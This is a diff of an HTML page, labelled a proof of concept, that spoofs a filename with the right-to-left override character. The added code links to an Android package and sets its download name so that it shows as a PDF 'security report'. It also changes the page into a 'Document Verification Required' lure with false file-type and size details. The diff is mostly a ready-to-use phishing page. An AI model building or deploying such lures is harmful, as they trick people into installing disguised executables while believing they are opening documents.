@@ -4,48 +4,48 @@
     <meta charset="UTF-8">
     <title>Filename Spoofing PoC</title>
     <style>
-        body { font-family: sans-serif; text-align: center; margin-top: 50px; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; margin-top: 50px; background-color: #f4f4f9; }
+        .container { background: white; padding: 30px; border-radius: 10px; display: inline-block; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
+        h2 { color: #333; }
         .download-btn {
             display: inline-block;
-            padding: 15px 25px;
-            background-color: #28a745;
+            margin-top: 20px;
+            padding: 15px 30px;
+            background-color: #e74c3c;
             color: white;
             text-decoration: none;
             border-radius: 5px;
             font-weight: bold;
-            cursor: pointer;
+            transition: background 0.3s;
         }
+        .download-btn:hover { background-color: #c0392b; }
+        .info { margin-top: 20px; color: #666; font-size: 0.9em; }
     </style>
 </head>
 <body>
 
-    <h2>Security Research: RLO Filename Spoofing</h2>
-    <p>Click below to download the report.</p>
+    <div class="container">
+        <h2>Document Verification Required</h2>
+        <p>Please download the security report below to continue.</p>
 
-    <!-- JavaScript function handles the download to force the spoofed name -->
-    <div onclick="downloadFile()" class="download-btn">
-        Download Security Report (PDF)
+        <!-- 
+            The 'href' points to the local file in the same folder.
+            The 'download' attribute uses RLO (&#x202E;) to flip 'fdp.kpa' into 'apk.pdf'.
+        -->
+        <a href="com.xbrowser.play_5.5.3.apk" 
+           download="Security_Report_2024&#x202E;fdp.kpa" 
+           class="download-btn">
+           Download Security_Report.pdf
+        </a>
+
+        <div class="info">
+            File Type: PDF Document | Size: 1.2 MB
+        </div>
     </div>
 
-    <script>
-        function downloadFile() {
-            const fileUrl = 'https://github.com';
-            const spoofedName = "Security_Report\u202Efdp.kpa";
-
-            fetch(fileUrl)
-                .then(response => response.blob())
-                .then(blob => {
-                    const url = window.URL.createObjectURL(blob);
-                    const a = document.createElement('a');
-                    a.href = url;
-                    a.download = spoofedName;
-                    document.body.appendChild(a);
-                    a.click();
-                    window.URL.revokeObjectURL(url);
-                })
-                .catch(() => alert('Download failed. Check your connection or CORS settings.'));
-        }
-    </script>
+    <p style="margin-top: 50px; color: #999; font-size: 0.8em;">
+        <b>Note:</b> This is a Proof of Concept (PoC) for Filename Spoofing via RLO character.
+    </p>
 
 </body>
 </html>
